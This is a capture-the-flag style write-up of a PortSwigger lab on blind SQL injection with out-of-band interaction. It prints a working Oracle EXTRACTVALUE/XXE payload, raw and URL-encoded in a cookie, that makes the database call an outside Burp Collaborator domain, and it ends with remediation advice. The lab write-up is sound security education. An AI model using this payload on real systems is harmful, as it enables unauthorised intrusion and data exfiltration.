# PortSwigger Lab: Blind SQL Injection with Out-of-Band Interaction

**Difficulty:** Practitioner
**Target:** PortSwigger Web Security Academy

## Objective

The goal of this lab is to exploit a blind SQL injection vulnerability in the `TrackingId` analytics cookie. Because the application executes the SQL query asynchronously, it has no effect on the HTTP response content, status code, or response time. To solve the lab, we must leverage out-of-band (OAST) techniques to force the backend database to perform an external DNS lookup to **Burp Collaborator**.

## The Vulnerability Concept

When a vulnerable SQL query is processed asynchronously by a background thread, traditional in-band and blind techniques (such as UNION attacks, boolean conditions, verbose errors, or time delays) become completely ineffective because the HTTP response is returned to the user independently of the database execution. 

In these scenarios, attackers can exploit **Out-of-Band Application Security Testing (OAST)** channels. Many database management systems provide built-in functions or XML parsers capable of making external network requests over DNS or HTTP. For example, in Oracle databases, the `EXTRACTVALUE()` function can parse an `xmltype` object containing an XML External Entity (XXE) payload. When the database resolves the external entity, it triggers a DNS lookup to an attacker-controlled server (such as Burp Collaborator), confirming the vulnerability and providing a channel to exfiltrate data.

## Step-by-Step Exploitation

### 1. Reconnaissance & Traffic Interception

I started by reviewing the lab instructions, which noted that the `TrackingId` cookie is executed asynchronously in a SQL query and that our objective is to trigger an out-of-band DNS lookup to Burp Collaborator.

![Lab Description](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/Lab%20Description.png)

Next, I launched the lab environment and browsed the main e-commerce storefront to generate standard HTTP traffic.

![Storefront Home](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/StoreFront%20Home.png)

Opening Burp Suite Professional, I navigated to the **Proxy -> HTTP history** tab and located the initial `GET /` request containing the `TrackingId` cookie (`TrackingId=4nvnoHdYECOwytgN`).

![Proxy HTTP History](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/Proxy%20HTTP%20History.png)

I sent this request over to **Burp Repeater** so I could modify the `TrackingId` cookie and inject our out-of-band payload.

![Sending Request to Repeater](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/Sending%20Request%20To%20Repeater.png)

### 2. Generating a Burp Collaborator Payload

To capture out-of-band DNS interactions, I switched to the **Collaborator** tab in Burp Suite Professional and clicked **Copy to clipboard** to generate a unique Burp Collaborator subdomain (`lod7ll9i2y8jc2two04nmiqkhq8ey2n.oastify.com`).

![Generating Burp Collaborator Payload](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/Generating%20Burp%20Collaborator%20Payload.png)

### 3. Crafting & Injecting the OAST Payload

Consulting the PortSwigger SQL injection cheat sheet for out-of-band DNS lookups, I selected the Oracle `EXTRACTVALUE()` XML External Entity (XXE) technique. By concatenating (`||`) or appending a `UNION SELECT` query that invokes `EXTRACTVALUE(xmltype(...))`, we can force the Oracle XML parser to fetch an external DTD over HTTP/DNS from our Collaborator domain:

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://lod7ll9i2y8jc2two04nmiqkhq8ey2n.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

After URL-encoding key characters (such as spaces as `+`, `?` as `%3f`, `=` as `%3d`, `%` as `%25`, and `;` as `%3b`) so they don't break the HTTP cookie header syntax, I appended the payload to the `TrackingId` cookie in **Burp Repeater**:

`TrackingId=4nvnoHdYECOwytgN'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//lod7ll9i2y8jc2two04nmiqkhq8ey2n.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`

Sending the request returned an `HTTP/2 200 OK` response, and the lab status banner in the background immediately updated to **Solved**.

![Injecting OAST Payload in Repeater](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/Injecting%20OAST%20Payload%20in%20Repeater.png)

### 4. Verifying the DNS Lookup in Collaborator

Switching back to the **Collaborator** tab and clicking **Poll now** revealed four incoming **DNS** type `A` lookups originating from the lab server for our Collaborator domain (`lod7ll9i2y8jc2two04nmiqkhq8ey2n.oastify.com`), proving that the backend Oracle database evaluated our injected XML payload and reached out over the network.

![Verifying DNS Interactions in Collaborator](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/Verifying%20DNS%20Interactions%20in%20Collaborator.png)

Refreshing the main storefront in the browser displayed the **"Congratulations, you solved the lab!"** banner.

![Lab Solved Confirmation](images/Blind%20SQL%20Injection%20with%20Out-of-Band%20Interaction/Lab%20Solved%20Confirmation.png)

## Remediation

To prevent out-of-band SQL injection vulnerabilities, developers and database administrators should implement defense-in-depth:

1. **Use Parameterized Queries (Prepared Statements):** Ensure all database queries—including asynchronous analytics queries parsing cookies and headers—use parameterized statements so user input is strictly treated as literal data and cannot inject subqueries or invoke functions like `EXTRACTVALUE()`.
2. **Restrict Database Network Egress & XML Parsing:** Configure strict outbound firewall rules on database servers to block unauthorized external DNS and HTTP requests, and disable external entity resolution (XXE) within database XML parsers such as `xmltype`.